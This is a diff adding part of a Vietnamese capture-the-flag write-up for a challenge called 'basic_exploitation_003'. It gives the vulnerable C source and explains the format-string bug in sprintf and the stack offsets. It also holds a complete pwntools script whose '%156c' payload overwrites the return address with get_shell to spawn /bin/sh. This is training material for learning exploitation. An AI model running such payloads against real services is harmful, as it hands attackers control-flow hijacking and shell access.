@@ -130,3 +130,62 @@ payload = payload + p64(changeme)
 p.sendline(payload)
 p.interactive()
 ```
+basic_exploitation_003
+-
+
+*
+```sh
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+void get_shell() {
+    system("/bin/sh");
+}
+int main(int argc, char *argv[]) {
+    char *heap_buf = (char *)malloc(0x80);
+    char stack_buf[0x90] = {};
+    initialize();
+    read(0, heap_buf, 0x80);
+    sprintf(stack_buf, heap_buf);   # Tận dụng lỗ hổng chuỗi định dạng ở đây
+    printf("ECHO : %s\n", stack_buf);
+    return 0;
+}
+```
+* <img width="229" height="325" alt="image" src="https://github.com/user-attachments/assets/c96cffa2-2396-46f3-9513-61011356752a" />
+ - Ta thấy được ở đây khoảng cách từ đỉnh ngăn xếp đến đáy của EBP là `0x98` byte : `ebp - 0x98`
+* ở đoạn mã C có `sprintf(stack_buf, heap_buf)`: có nghĩa là lấy chuỗi kết quả từ `heap_buf` để ghi thẳng trực tiếp vào `stack_buf`
+
+  -> ta có thể khai thác lỗi chuỗi định dàng này để ghi đè vào khoảng cách từ đỉnh ngắn xếp đến ebp và địa chỉ trả về
+
+ ```sh
+ l = 0x98 + 0x4
+ payload = f"%{l}c".encode() + p32(get_shell)
+ ```
+- tạo thành chuỗi thực tế chỉ dài 9 byte gửi đi qua biến `heap_buf` : `b'%156c'\x69\x86\x04\x08` nên thỏa mãn điều kiện
+- khi hàm `sprintf` thực thi nó sẽ sinh ra 156 ký tự khoảng trắng và đổ vào Stack , 156 kí tự này lấp đầy chính xác `stack_buf` và 4 byte địa chỉ của get_shell tiếp theo sẽ nằm chính xác ở ô chứa địa chỉ RET, và ghi đề địa chỉ của hàm `get_shell` vào đó.
+*
+```sh
+from pwn import * 
+
+p = remote("")
+e = ELF("./basic_exploitation_003")
+
+get_shell = e.symbols["get_shell"]
+
+l = 0x98 + 0x4
+
+payload = f"%{l}c".encode() + p32(get_shell)
+p.send(payload)
+p.interactive()
+```
